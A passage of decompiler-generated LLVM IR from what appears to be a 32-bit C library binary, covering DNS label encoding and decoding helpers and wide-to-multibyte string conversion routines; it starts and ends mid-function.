  %v2_804ed09 = mul nuw nsw i32 %v3_804ed06, 2
  %v3_804ed09 = add i32 %v2_804ed09, %v0_804ecfc
  %v4_804ed09 = inttoptr i32 %v3_804ed09 to i16*
  %v5_804ed09 = load i16, i16* %v4_804ed09, align 2
  %v6_804ed09 = sext i16 %v5_804ed09 to i32
  %v1_804ed0d = inttoptr i32 %v0_804ed1f to i8*
  %v2_804ed0d = load i8, i8* %v1_804ed0d, align 1
  %v3_804ed0d = zext i8 %v2_804ed0d to i32
  %v2_804ed10 = mul nuw nsw i32 %v3_804ed0d, 2
  %v3_804ed10 = add i32 %v2_804ed10, %v0_804ecfc
  %v4_804ed10 = inttoptr i32 %v3_804ed10 to i16*
  %v5_804ed10 = load i16, i16* %v4_804ed10, align 2
  %v6_804ed10 = sext i16 %v5_804ed10 to i32
  %v2_804ed14 = sub nsw i32 %v6_804ed09, %v6_804ed10
  %v12_804ed14 = icmp eq i32 %v2_804ed14, 0
  store i32 %v2_804ed14, i32* @edx, align 4
  %v1_804ed18 = icmp eq i1 %v12_804ed14, false
  br i1 %v1_804ed18, label %dec_label_pc_804ed23, label %dec_label_pc_804ed1a

dec_label_pc_804ed1a:                             ; preds = %dec_label_pc_804ed02, %dec_label_pc_804ed06
  %v0_804ed257 = phi i32 [ %v2_804ed14, %dec_label_pc_804ed06 ], [ %v0_804ed256, %dec_label_pc_804ed02 ]
  %v2_804ed1a = load i8, i8* %.pre, align 1
  %v3_804ed1a = icmp eq i8 %v2_804ed1a, 0
  br i1 %v3_804ed1a, label %dec_label_pc_804ed23, label %dec_label_pc_804ed1f

dec_label_pc_804ed1f:                             ; preds = %dec_label_pc_804ed1a
  %v1_804ed1f = add i32 %v0_804ed1f, 1
  %v1_804ed20 = add i32 %v0_804ed20, 1
  store i32 %v1_804ed20, i32* @ecx, align 4
  br label %dec_label_pc_804ed02

dec_label_pc_804ed23:                             ; preds = %dec_label_pc_804ed1a, %dec_label_pc_804ed06
  %v0_804ed25 = phi i32 [ %v0_804ed257, %dec_label_pc_804ed1a ], [ %v2_804ed14, %dec_label_pc_804ed06 ]
  ret i32 %v0_804ed25

; uselistorder directives
  uselistorder i32 %v1_804ed20, { 1, 0 }
  uselistorder i32 %v0_804ed257, { 1, 0 }
  uselistorder i32 %v2_804ed14, { 1, 0, 2, 3 }
  uselistorder i32 %v0_804ed20, { 2, 1, 0 }
  uselistorder i32 %v0_804ed1f, { 1, 2, 0 }
  uselistorder label %dec_label_pc_804ed1a, { 1, 0 }
}

define i32 @__encode_dotted(i8* %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5, i32 %arg6, i32 %arg7) local_unnamed_addr {
entry:
  %ebx.global-to-local = alloca i32, align 4
  %v0_804ed29 = load i32, i32* @edi, align 4
  %v0_804ed2a = load i32, i32* @esi, align 4
  store i32 0, i32* %ebx.global-to-local, align 4
  %v4_804ed31 = ptrtoint i8* %arg1 to i32
  store i32 %v4_804ed31, i32* @edi, align 4
  %v1_804ed906 = icmp eq i8* %arg1, null
  br i1 %v1_804ed906, label %dec_label_pc_804ed99, label %dec_label_pc_804ed94.lr.ph

dec_label_pc_804ed94.lr.ph:                       ; preds = %entry
  br label %dec_label_pc_804ed94

dec_label_pc_804ed37:                             ; preds = %dec_label_pc_804ed94
  %v5_804ed3c = call i32 @__GI_strchr(i8* %v1_804ed94, i32 46)
  %v1_804ed46 = icmp eq i32 %v5_804ed3c, 0
  br i1 %v1_804ed46, label %dec_label_pc_804ed50, label %dec_label_pc_804ed4a

dec_label_pc_804ed4a:                             ; preds = %dec_label_pc_804ed37
  %v1_804ed4c = load i32, i32* @edi, align 4
  %v2_804ed4c = sub i32 %v5_804ed3c, %v1_804ed4c
  br label %dec_label_pc_804ed5e

dec_label_pc_804ed50:                             ; preds = %dec_label_pc_804ed37
  %v0_804ed53 = load i32, i32* @edi, align 4
  %v5_804ed53 = inttoptr i32 %v0_804ed53 to i8*
  %v3_804ed54 = call i32 @strlen(i8* %v5_804ed53)
  br label %dec_label_pc_804ed5e

dec_label_pc_804ed5e:                             ; preds = %dec_label_pc_804ed4a, %dec_label_pc_804ed50
  %v0_804ed71 = phi i32 [ %v2_804ed4c, %dec_label_pc_804ed4a ], [ %v3_804ed54, %dec_label_pc_804ed50 ]
  store i32 %v0_804ed71, i32* @esi, align 4
  %v1_804ed5e = icmp eq i32 %v0_804ed71, 0
  %v3_804ed5e = trunc i32 %v0_804ed71 to i8
  br i1 %v1_804ed5e, label %dec_label_pc_804edad, label %dec_label_pc_804ed62

dec_label_pc_804ed62:                             ; preds = %dec_label_pc_804ed5e
  %v1_804ed66 = load i32, i32* %ebx.global-to-local, align 4
  %v2_804ed66 = sub i32 %arg3, %v1_804ed66
  %v1_804ed68 = add i32 %v2_804ed66, -1
  %v7_804ed69 = icmp ult i32 %v0_804ed71, %v1_804ed68
  %v1_804ed6b = icmp eq i1 %v7_804ed69, false
  br i1 %v1_804ed6b, label %dec_label_pc_804edad, label %dec_label_pc_804ed6d

dec_label_pc_804ed6d:                             ; preds = %dec_label_pc_804ed62
  store i32 %arg2, i32* @edx, align 4
  %v4_804ed73 = add i32 %v1_804ed66, %arg2
  %v5_804ed73 = inttoptr i32 %v4_804ed73 to i8*
  store i8 %v3_804ed5e, i8* %v5_804ed73, align 1
  %v0_804ed76 = load i32, i32* %ebx.global-to-local, align 4
  %v1_804ed76 = add i32 %v0_804ed76, 1
  %v0_804ed78 = load i32, i32* @edx, align 4
  %v2_804ed7a = add i32 %v1_804ed76, %v0_804ed78
  %v0_804ed7c = load i32, i32* @esi, align 4
  %v0_804ed7d = load i32, i32* @edi, align 4
  %v2_804ed7f = add i32 %v0_804ed7c, %v1_804ed76
  store i32 %v2_804ed7f, i32* %ebx.global-to-local, align 4
  %tmp31 = inttoptr i32 %v2_804ed7a to i16*
  %v7_804ed81 = call i32 @memcpy(i16* %tmp31, i32 %v0_804ed7d, i32 %v0_804ed7c)
  %v1_804ed8d = add i32 %v5_804ed3c, 1
  br i1 %v1_804ed46, label %dec_label_pc_804ed99, label %dec_label_pc_804ed90

dec_label_pc_804ed90:                             ; preds = %dec_label_pc_804ed6d
  store i32 %v1_804ed8d, i32* @edi, align 4
  %v1_804ed90 = icmp eq i32 %v1_804ed8d, 0
  br i1 %v1_804ed90, label %dec_label_pc_804ed99, label %dec_label_pc_804ed94

dec_label_pc_804ed94:                             ; preds = %dec_label_pc_804ed94.lr.ph, %dec_label_pc_804ed90
  %v0_804ed3b = phi i32 [ %v4_804ed31, %dec_label_pc_804ed94.lr.ph ], [ %v1_804ed8d, %dec_label_pc_804ed90 ]
  %v1_804ed94 = inttoptr i32 %v0_804ed3b to i8*
  %v2_804ed94 = load i8, i8* %v1_804ed94, align 1
  %v3_804ed94 = icmp eq i8 %v2_804ed94, 0
  %v1_804ed97 = icmp eq i1 %v3_804ed94, false
  br i1 %v1_804ed97, label %dec_label_pc_804ed37, label %dec_label_pc_804ed99

dec_label_pc_804ed99:                             ; preds = %dec_label_pc_804ed90, %dec_label_pc_804ed94, %dec_label_pc_804ed6d, %entry
  %tmp32 = icmp slt i32 %arg3, 1
  br i1 %tmp32, label %dec_label_pc_804edad, label %dec_label_pc_804eda0

dec_label_pc_804eda0:                             ; preds = %dec_label_pc_804ed99
  %v1_804eda4 = load i32, i32* %ebx.global-to-local, align 4
  %v2_804eda4 = add i32 %v1_804eda4, %arg2
  %v3_804eda4 = inttoptr i32 %v2_804eda4 to i8*
  store i8 0, i8* %v3_804eda4, align 1
  %v0_804eda8 = load i32, i32* %ebx.global-to-local, align 4
  %v1_804eda8 = add i32 %v0_804eda8, 1
  br label %dec_label_pc_804edb0

dec_label_pc_804edad:                             ; preds = %dec_label_pc_804ed62, %dec_label_pc_804ed5e, %dec_label_pc_804ed99
  br label %dec_label_pc_804edb0

dec_label_pc_804edb0:                             ; preds = %dec_label_pc_804eda0, %dec_label_pc_804edad
  %storemerge4 = phi i32 [ %v1_804eda8, %dec_label_pc_804eda0 ], [ -1, %dec_label_pc_804edad ]
  store i32 %v0_804ed2a, i32* @esi, align 4
  store i32 %v0_804ed29, i32* @edi, align 4
  ret i32 %storemerge4

; uselistorder directives
  uselistorder i8* %v1_804ed94, { 1, 0 }
  uselistorder i32 %v1_804ed8d, { 0, 2, 1 }
  uselistorder i32 %v0_804ed7c, { 1, 0 }
  uselistorder i1 %v1_804ed46, { 1, 0 }
  uselistorder i32 %v5_804ed3c, { 2, 0, 1 }
  uselistorder i32* %ebx.global-to-local, { 1, 2, 0, 3, 4, 5 }
  uselistorder i32 (i8*)* @strlen, { 4, 7, 6, 1, 8, 0, 5, 3, 2 }
  uselistorder i32 (i8*, i32)* @__GI_strchr, { 3, 4, 5, 0, 1, 2, 6 }
  uselistorder i32 46, { 1, 2, 0, 3 }
  uselistorder label %dec_label_pc_804edb0, { 1, 0 }
  uselistorder label %dec_label_pc_804edad, { 2, 0, 1 }
  uselistorder label %dec_label_pc_804ed99, { 1, 0, 2, 3 }
  uselistorder label %dec_label_pc_804ed94, { 1, 0 }
  uselistorder label %dec_label_pc_804ed5e, { 1, 0 }
}

define i32 @__decode_dotted(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %ebp.global-to-local = alloca i32, align 4
  %v0_804edba = load i32, i32* @esi, align 4
  store i32 %arg2, i32* @edx, align 4
  %v4_804edc3 = icmp eq i32 %arg1, 0
  br i1 %v4_804edc3, label %dec_label_pc_804ee84, label %dec_label_pc_804edce

dec_label_pc_804edce:                             ; preds = %entry
  store i32 0, i32* %ebp.global-to-local, align 4
  store i32 0, i32* @ecx, align 4
  %v2_804ee6c2740 = add i32 %arg2, %arg1
  %v3_804ee6c2841 = inttoptr i32 %v2_804ee6c2740 to i8*
  %v4_804ee6c2942 = load i8, i8* %v3_804ee6c2841, align 1
  %v1_804ee703144 = icmp eq i8 %v4_804ee6c2942, 0
  %v1_804ee723245 = icmp eq i1 %v1_804ee703144, false
  br i1 %v1_804ee723245, label %dec_label_pc_804eddc.lr.ph, label %dec_label_pc_804ee78

dec_label_pc_804eddc:                             ; preds = %dec_label_pc_804eddc.lr.ph, %dec_label_pc_804edf5
  %v0_804ede6 = phi i32 [ %v0_804ede6.pre, %dec_label_pc_804eddc.lr.ph ], [ %v4_804ee00, %dec_label_pc_804edf5 ]
  %v8_804eddc38 = phi i1 [ %v8_804eddc3350, %dec_label_pc_804eddc.lr.ph ], [ true, %dec_label_pc_804edf5 ]
  %v5_804ee6c37.in = phi i8 [ %v5_804ee6c3049.in, %dec_label_pc_804eddc.lr.ph ], [ %v4_804ee6c, %dec_label_pc_804edf5 ]
  %stack_var_-17.136 = phi i8 [ %stack_var_-17.1.ph48, %dec_label_pc_804eddc.lr.ph ], [ 0, %dec_label_pc_804edf5 ]
  %v0_804ede335 = phi i32 [ %v0_804ede3.ph46, %dec_label_pc_804eddc.lr.ph ], [ %v2_804ee0f, %dec_label_pc_804edf5 ]
  %v5_804ee6c37 = zext i8 %v5_804ee6c37.in to i32
  %v1_804ede3 = add i32 %v0_804ede335, 1
  store i32 %v1_804ede3, i32* @esi, align 4
  %v3_804ede6 = select i1 %v8_804eddc38, i32 2, i32 1
  %v4_804ede6 = add i32 %v3_804ede6, %v0_804ede6
  store i32 %v4_804ede6, i32* %ebp.global-to-local, align 4
  %v1_804ede9 = and i32 %v5_804ee6c37, 192
  %v6_804edee = icmp eq i32 %v1_804ede9, 192
  %v1_804edf3 = icmp eq i1 %v6_804edee, false
  br i1 %v1_804edf3, label %dec_label_pc_804ee18, label %dec_label_pc_804edf5

dec_label_pc_804edf5:                             ; preds = %dec_label_pc_804eddc
  %v4_804ee00 = add i32 %v3_804ede6, %v4_804ede6
  store i32 %v4_804ee00, i32* %ebp.global-to-local, align 4
  %tmp = urem i8 %v5_804ee6c37.in, 64
  %v1_804ee03 = zext i8 %tmp to i32
  %v2_804ee06 = add i32 %v1_804ede3, %arg1
  %v3_804ee06 = inttoptr i32 %v2_804ee06 to i8*
  %v4_804ee06 = load i8, i8* %v3_804ee06, align 1
  %v5_804ee06 = zext i8 %v4_804ee06 to i32
  %v2_804ee0a = mul nuw nsw i32 %v1_804ee03, 256
  %v2_804ee0f = or i32 %v5_804ee06, %v2_804ee0a
  store i32 %v2_804ee0f, i32* @edx, align 4
  store i32 %v1_804ee35.ph47, i32* @ecx, align 4
  %v2_804ee6c = add i32 %v2_804ee0f, %arg1
  %v3_804ee6c = inttoptr i32 %v2_804ee6c to i8*
  %v4_804ee6c = load i8, i8* %v3_804ee6c, align 1
  %v1_804ee70 = icmp eq i8 %v4_804ee6c, 0
  %v1_804ee72 = icmp eq i1 %v1_804ee70, false
  br i1 %v1_804ee72, label %dec_label_pc_804eddc, label %dec_label_pc_804ee78

dec_label_pc_804ee18:                             ; preds = %dec_label_pc_804eddc
  %v2_804ee18 = add i32 %v5_804ee6c37, %v1_804ee35.ph47
  %v1_804ee21 = add i32 %v2_804ee18, 1
  store i32 %v1_804ee21, i32* @edi, align 4
  %v10_804ee22 = icmp ult i32 %v1_804ee21, %arg4
  %v1_804ee26 = icmp eq i1 %v10_804ee22, false
  br i1 %v1_804ee26, label %dec_label_pc_804ee84, label %dec_label_pc_804ee28

dec_label_pc_804ee28:                             ; preds = %dec_label_pc_804ee18
  %v2_804ee2e = add i32 %v1_804ede3, %arg1
  %v2_804ee35 = add i32 %v1_804ee35.ph47, %arg3
  %v3_804ee38 = inttoptr i32 %v2_804ee35 to i16*
  %v4_804ee38 = call i32 @memcpy(i16* %v3_804ee38, i32 %v2_804ee2e, i32 %v5_804ee6c37)
  %v0_804ee40 = load i32, i32* @esi, align 4
  %v2_804ee40 = add i32 %v0_804ee40, %v5_804ee6c37
  store i32 %v2_804ee40, i32* @edx, align 4
  br i1 %v8_804eddc38, label %dec_label_pc_804ee4c, label %dec_label_pc_804ee4a

dec_label_pc_804ee4a:                             ; preds = %dec_label_pc_804ee28
  %v0_804ee4a = load i32, i32* %ebp.global-to-local, align 4
  %v2_804ee4a = add i32 %v0_804ee4a, %v5_804ee6c37
  store i32 %v2_804ee4a, i32* %ebp.global-to-local, align 4
  br label %dec_label_pc_804ee4c

dec_label_pc_804ee4c:                             ; preds = %dec_label_pc_804ee28, %dec_label_pc_804ee4a
  %v4_804ee63 = add i32 %v2_804ee18, %arg3
  %v5_804ee63 = inttoptr i32 %v4_804ee63 to i8*
  store i8 46, i8* %v5_804ee63, align 1
  %v0_804ee66.pre = load i32, i32* @edi, align 4
  %v1_804ee6c.pre.pre = load i32, i32* @edx, align 4
  store i32 %v0_804ee66.pre, i32* @ecx, align 4
  %v2_804ee6c27 = add i32 %v1_804ee6c.pre.pre, %arg1
  %v3_804ee6c28 = inttoptr i32 %v2_804ee6c27 to i8*
  %v4_804ee6c29 = load i8, i8* %v3_804ee6c28, align 1
  %v1_804ee7031 = icmp eq i8 %v4_804ee6c29, 0
  %v1_804ee7232 = icmp eq i1 %v1_804ee7031, false
  %v8_804eddc33 = icmp eq i8 %stack_var_-17.136, 0
  %v0_804ede6.pre.pre = load i32, i32* %ebp.global-to-local, align 4
  br i1 %v1_804ee7232, label %dec_label_pc_804eddc.lr.ph, label %dec_label_pc_804ee78

dec_label_pc_804eddc.lr.ph:                       ; preds = %dec_label_pc_804ee4c, %dec_label_pc_804edce
  %v0_804ede6.pre = phi i32 [ 0, %dec_label_pc_804edce ], [ %v0_804ede6.pre.pre, %dec_label_pc_804ee4c ]
  %v8_804eddc3350 = phi i1 [ false, %dec_label_pc_804edce ], [ %v8_804eddc33, %dec_label_pc_804ee4c ]
  %v5_804ee6c3049.in = phi i8 [ %v4_804ee6c2942, %dec_label_pc_804edce ], [ %v4_804ee6c29, %dec_label_pc_804ee4c ]
  %stack_var_-17.1.ph48 = phi i8 [ 1, %dec_label_pc_804edce ], [ %stack_var_-17.136, %dec_label_pc_804ee4c ]
  %v1_804ee35.ph47 = phi i32 [ 0, %dec_label_pc_804edce ], [ %v0_804ee66.pre, %dec_label_pc_804ee4c ]
  %v0_804ede3.ph46 = phi i32 [ %arg2, %dec_label_pc_804edce ], [ %v1_804ee6c.pre.pre, %dec_label_pc_804ee4c ]
  br label %dec_label_pc_804eddc

dec_label_pc_804ee78:                             ; preds = %dec_label_pc_804ee4c, %dec_label_pc_804edf5, %dec_label_pc_804edce
  %v0_804ee7d = phi i32 [ 0, %dec_label_pc_804edce ], [ %v4_804ee00, %dec_label_pc_804edf5 ], [ %v0_804ede6.pre.pre, %dec_label_pc_804ee4c ]
  %v8_804eddc.lcssa = phi i1 [ false, %dec_label_pc_804edce ], [ true, %dec_label_pc_804edf5 ], [ %v8_804eddc33, %dec_label_pc_804ee4c ]
  %v2_804ee7f = zext i1 %v8_804eddc.lcssa to i32
  %v3_804ee7f = add i32 %v0_804ee7d, 1
  %v4_804ee7f = add i32 %v3_804ee7f, %v2_804ee7f
  br label %dec_label_pc_804ee87

dec_label_pc_804ee84:                             ; preds = %dec_label_pc_804ee18, %entry
  br label %dec_label_pc_804ee87

dec_label_pc_804ee87:                             ; preds = %dec_label_pc_804ee78, %dec_label_pc_804ee84
  %storemerge = phi i32 [ %v4_804ee7f, %dec_label_pc_804ee78 ], [ -1, %dec_label_pc_804ee84 ]
  store i32 %v0_804edba, i32* @esi, align 4
  ret i32 %storemerge

; uselistorder directives
  uselistorder i32 %v1_804ee35.ph47, { 2, 1, 0 }
  uselistorder i8 %v4_804ee6c, { 1, 0 }
  uselistorder i32 %v2_804ee0f, { 0, 2, 1 }
  uselistorder i32 %v4_804ee00, { 0, 2, 1 }
  uselistorder i32 %v5_804ee6c37, { 4, 3, 1, 2, 0 }
  uselistorder i32* %ebp.global-to-local, { 3, 0, 2, 1, 4, 5 }
  uselistorder i8 1, { 1, 4, 5, 7, 2, 6, 0, 3 }
  uselistorder i8 46, { 4, 0, 5, 1, 2, 3 }
  uselistorder i32 %arg1, { 1, 3, 2, 4, 0, 5 }
  uselistorder label %dec_label_pc_804ee87, { 1, 0 }
  uselistorder label %dec_label_pc_804ee4c, { 1, 0 }
}

define i32 @__length_dotted(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %v1_804ee9e = icmp eq i32 %arg1, 0
  br i1 %v1_804ee9e, label %dec_label_pc_804eecd, label %dec_label_pc_804eebe.preheader

dec_label_pc_804eebe.preheader:                   ; preds = %entry
  store i32 %arg2, i32* @ecx, align 4
  %v2_804eebe10 = add i32 %arg2, %arg1
  %v3_804eebe11 = inttoptr i32 %v2_804eebe10 to i8*
  %v4_804eebe12 = load i8, i8* %v3_804eebe11, align 1
  %v1_804eec214 = add i32 %arg2, 1
  %v1_804eec515 = icmp eq i8 %v4_804eebe12, 0
  %v1_804eec716 = icmp eq i1 %v1_804eec515, false
  br i1 %v1_804eec716, label %dec_label_pc_804eead, label %dec_label_pc_804eec9

dec_label_pc_804eea4:                             ; preds = %dec_label_pc_804eead
  %v1_804eea4 = add i32 %v0_804eea417, 2
  br label %dec_label_pc_804eec9

dec_label_pc_804eead:                             ; preds = %dec_label_pc_804eebe.preheader, %dec_label_pc_804eebe
  %v1_804eec219 = phi i32 [ %v1_804eec2, %dec_label_pc_804eebe ], [ %v1_804eec214, %dec_label_pc_804eebe.preheader ]
  %v5_804eebe18.in = phi i8 [ %v4_804eebe, %dec_label_pc_804eebe ], [ %v4_804eebe12, %dec_label_pc_804eebe.preheader ]
  %v0_804eea417 = phi i32 [ %v2_804eebb, %dec_label_pc_804eebe ], [ %arg2, %dec_label_pc_804eebe.preheader ]
  %v5_804eebe18 = zext i8 %v5_804eebe18.in to i32
  %v1_804eeaf = and i32 %v5_804eebe18, 192
  %v6_804eeb4 = icmp eq i32 %v1_804eeaf, 192
  %v2_804eebb = add i32 %v5_804eebe18, %v1_804eec219
  br i1 %v6_804eeb4, label %dec_label_pc_804eea4, label %dec_label_pc_804eebe

dec_label_pc_804eebe:                             ; preds = %dec_label_pc_804eead
  store i32 %v2_804eebb, i32* @ecx, align 4
  %v2_804eebe = add i32 %v2_804eebb, %arg1
  %v3_804eebe = inttoptr i32 %v2_804eebe to i8*
  %v4_804eebe = load i8, i8* %v3_804eebe, align 1
  %v1_804eec2 = add i32 %v2_804eebb, 1
  %v1_804eec5 = icmp eq i8 %v4_804eebe, 0
  %v1_804eec7 = icmp eq i1 %v1_804eec5, false
  br i1 %v1_804eec7, label %dec_label_pc_804eead, label %dec_label_pc_804eec9

dec_label_pc_804eec9:                             ; preds = %dec_label_pc_804eebe.preheader, %dec_label_pc_804eebe, %dec_label_pc_804eea4
  %v0_804eec9 = phi i32 [ %v1_804eea4, %dec_label_pc_804eea4 ], [ %v1_804eec214, %dec_label_pc_804eebe.preheader ], [ %v1_804eec2, %dec_label_pc_804eebe ]
  %v2_804eecb = sub i32 %v0_804eec9, %arg2
  br label %dec_label_pc_804eecd

dec_label_pc_804eecd:                             ; preds = %entry, %dec_label_pc_804eec9
  %v0_804eed0 = phi i32 [ -1, %entry ], [ %v2_804eecb, %dec_label_pc_804eec9 ]
  ret i32 %v0_804eed0

; uselistorder directives
  uselistorder i8 %v4_804eebe, { 1, 0 }
  uselistorder i32 %v2_804eebb, { 2, 3, 1, 0 }
  uselistorder i32 192, { 0, 2, 1, 3 }
  uselistorder i32 %arg2, { 4, 0, 1, 2, 3 }
  uselistorder i32 %arg1, { 1, 0, 2 }
  uselistorder label %dec_label_pc_804eecd, { 1, 0 }
  uselistorder label %dec_label_pc_804eec9, { 1, 2, 0 }
  uselistorder label %dec_label_pc_804eead, { 1, 0 }
}

define i32 @__GI_wcrtomb() local_unnamed_addr {
entry:
  %tmp = call i32 @__decompiler_undefined_function_0()
  %tmp4 = call i32 @__decompiler_undefined_function_0()
  %tmp5 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-8 = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %stack_var_-24 = alloca i32, align 4
  %v1_804eedf = icmp eq i32 %tmp5, 0
  %v1_804eee1 = icmp eq i1 %v1_804eedf, false
  br i1 %v1_804eee1, label %dec_label_pc_804eee9, label %dec_label_pc_804eee3

dec_label_pc_804eee3:                             ; preds = %entry
  %v2_804eee3 = ptrtoint i32* %stack_var_-24 to i32
  br label %dec_label_pc_804eee9

dec_label_pc_804eee9:                             ; preds = %entry, %dec_label_pc_804eee3
  %v0_804ef05 = phi i32 [ %tmp5, %entry ], [ %v2_804eee3, %dec_label_pc_804eee3 ]
  %v0_804eeed = phi i32 [ %tmp4, %entry ], [ 0, %dec_label_pc_804eee3 ]
  %v2_804eee9 = ptrtoint i32* %stack_var_-4 to i32
  store i32 %v0_804eeed, i32* %stack_var_-4, align 4
  store i32 %v2_804eee9, i32* %stack_var_-8, align 4
  %v2_804ef00 = ptrtoint i32* %stack_var_-8 to i32
  %v5_804ef06 = inttoptr i32 %v0_804ef05 to i8*
  %v6_804ef06 = call i32 @__GI_wcsnrtombs(i8* %v5_804ef06, i32 %v2_804ef00, i32 1, i32 16, i32 %tmp)
  %v1_804ef0e = icmp eq i32 %v6_804ef06, 0
  %v1_804ef10 = icmp eq i1 %v1_804ef0e, false
  br i1 %v1_804ef10, label %dec_label_pc_804ef14, label %dec_label_pc_804ef12

dec_label_pc_804ef12:                             ; preds = %dec_label_pc_804eee9
  %v1_804ef12 = and i32 %v6_804ef06, -256
  %v2_804ef12 = or i32 %v1_804ef12, 1
  br label %dec_label_pc_804ef14

dec_label_pc_804ef14:                             ; preds = %dec_label_pc_804eee9, %dec_label_pc_804ef12
  %v0_804ef17 = phi i32 [ %v6_804ef06, %dec_label_pc_804eee9 ], [ %v2_804ef12, %dec_label_pc_804ef12 ]
  ret i32 %v0_804ef17

; uselistorder directives
  uselistorder i32* %stack_var_-8, { 1, 0 }
  uselistorder label %dec_label_pc_804ef14, { 1, 0 }
  uselistorder label %dec_label_pc_804eee9, { 1, 0 }
}

define i32 @__GI_wcsrtombs() local_unnamed_addr {
entry:
  %tmp = call i32 @__decompiler_undefined_function_0()
  %tmp1 = call i32 @__decompiler_undefined_function_0()
  %tmp2 = call i32 @__decompiler_undefined_function_0()
  %tmp3 = call i32 @__decompiler_undefined_function_0()
  %v5_804ef2d = inttoptr i32 %tmp to i8*
  %v6_804ef2d = call i32 @__GI_wcsnrtombs(i8* %v5_804ef2d, i32 %tmp1, i32 -1, i32 %tmp2, i32 %tmp3)
  ret i32 %v6_804ef2d
}

define i32 @__GI_wcsnrtombs(i8* %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5) local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %ebp.global-to-local = alloca i32, align 4
  %ebx.global-to-local = alloca i32, align 4
  %edi.global-to-local = alloca i32, align 4
  %edx.global-to-local = alloca i32, align 4
  %esi.global-to-local = alloca i32, align 4
  %stack_var_-32 = alloca i32, align 4
  %v0_804ef3b = load i32, i32* @ebx, align 4
  %v4_804ef3f = ptrtoint i8* %arg1 to i32
  store i32 %v4_804ef3f, i32* %edx.global-to-local, align 4
  store i32 %arg2, i32* %ebp.global-to-local, align 4
  store i32 %arg4, i32* %eax.global-to-local, align 4
  %v1_804ef4b = icmp eq i8* %arg1, null
  br i1 %v1_804ef4b, label %dec_label_pc_804ef7f.thread, label %dec_label_pc_804ef4f

dec_label_pc_804ef4f:                             ; preds = %entry
  store i32 1, i32* %edi.global-to-local, align 4
  %v12_804ef54 = icmp eq i32 %v4_804ef3f, %arg2
  %v1_804ef56 = icmp eq i1 %v12_804ef54, false
  br i1 %v1_804ef56, label %dec_label_pc_804ef7f, label %dec_label_pc_804ef79

dec_label_pc_804ef7f.thread:                      ; preds = %entry
  store i32 0, i32* %edi.global-to-local, align 4
  %v2_804ef5c = ptrtoint i32* %stack_var_-32 to i32
  store i32 %v2_804ef5c, i32* %edx.global-to-local, align 4
  store i32 -1, i32* %eax.global-to-local, align 4
  store i32 %arg3, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_804ef89

dec_label_pc_804ef65:                             ; preds = %dec_label_pc_804ef90
  %v1_804ef65 = call i32 @__errno_location(i32 %v0_804ef3b)
  store i32 %v1_804ef65, i32* %eax.global-to-local, align 4
  %v1_804ef6a = inttoptr i32 %v1_804ef65 to i32*
  store i32 84, i32* %v1_804ef6a, align 4
  br label %dec_label_pc_804efb6

dec_label_pc_804ef75:                             ; preds = %dec_label_pc_804ef97
  store i32 0, i32* %esi.global-to-local, align 4
  %v0_804efab.pre = load i32, i32* %edx.global-to-local, align 4
  br label %dec_label_pc_804efa7

dec_label_pc_804ef79:                             ; preds = %dec_label_pc_804ef4f
  store i32 0, i32* %edi.global-to-local, align 4
  %v2_804ef7b = ptrtoint i32* %stack_var_-32 to i32
  store i32 %v2_804ef7b, i32* %edx.global-to-local, align 4
  br label %dec_label_pc_804ef7f

dec_label_pc_804ef7f:                             ; preds = %dec_label_pc_804ef4f, %dec_label_pc_804ef79
  %v2_804ef9715 = phi i32 [ %v4_804ef3f, %dec_label_pc_804ef4f ], [ %v2_804ef7b, %dec_label_pc_804ef79 ]
  store i32 %arg3, i32* %ebx.global-to-local, align 4
  %tmp33 = icmp ult i32 %arg4, %arg3
  br i1 %tmp33, label %dec_label_pc_804ef87, label %dec_label_pc_804ef89

dec_label_pc_804ef87:                             ; preds = %dec_label_pc_804ef7f
  store i32 %arg4, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_804ef89

dec_label_pc_804ef89:                             ; preds = %dec_label_pc_804ef7f.thread, %dec_label_pc_804ef7f, %dec_label_pc_804ef87
  %v2_804ef971532 = phi i32 [ %v2_804ef9715, %dec_label_pc_804ef7f ], [ %v2_804ef9715, %dec_label_pc_804ef87 ], [ %v2_804ef5c, %dec_label_pc_804ef7f.thread ]
  %v0_804ef8c = phi i32 [ %arg3, %dec_label_pc_804ef7f ], [ %arg4, %dec_label_pc_804ef87 ], [ %arg3, %dec_label_pc_804ef7f.thread ]
  %v1_804ef89 = inttoptr i32 %arg2 to i32*
  %v2_804ef89 = load i32, i32* %v1_804ef89, align 4
  store i32 %v2_804ef89, i32* %esi.global-to-local, align 4
  store i32 %v0_804ef8c, i32* @ecx, align 4
  %v1_804efa33 = icmp eq i32 %v0_804ef8c, 0
  %v1_804efa510 = icmp eq i1 %v1_804efa33, false
  br i1 %v1_804efa510, label %dec_label_pc_804ef90, label %dec_label_pc_804efa7

dec_label_pc_804ef90:                             ; preds = %dec_label_pc_804ef89, %dec_label_pc_804ef9d
  %v2_804ef97 = phi i32 [ %v2_804efa0, %dec_label_pc_804ef9d ], [ %v2_804ef971532, %dec_label_pc_804ef89 ]
  %v0_804ef90 = phi i32 [ %v1_804ef9d, %dec_label_pc_804ef9d ], [ %v2_804ef89, %dec_label_pc_804ef89 ]
  %v1_804ef90 = inttoptr i32 %v0_804ef90 to i32*
  %v2_804ef90 = load i32, i32* %v1_804ef90, align 4
  store i32 %v2_804ef90, i32* %eax.global-to-local, align 4
  %v6_804ef95 = icmp ugt i32 %v2_804ef90, 127
  br i1 %v6_804ef95, label %dec_label_pc_804ef65, label %dec_label_pc_804ef97

dec_label_pc_804ef97:                             ; preds = %dec_label_pc_804ef90
  %v1_804ef97 = trunc i32 %v2_804ef90 to i8
  %v3_804ef97 = inttoptr i32 %v2_804ef97 to i8*
  store i8 %v1_804ef97, i8* %v3_804ef97, align 1
  %v0_804ef99 = load i32, i32* %eax.global-to-local, align 4
  %v3_804ef99 = trunc i32 %v0_804ef99 to i8
  %v4_804ef99 = icmp eq i8 %v3_804ef99, 0
  br i1 %v4_804ef99, label %dec_label_pc_804ef75, label %dec_label_pc_804ef9d

dec_label_pc_804ef9d:                             ; preds = %dec_label_pc_804ef97
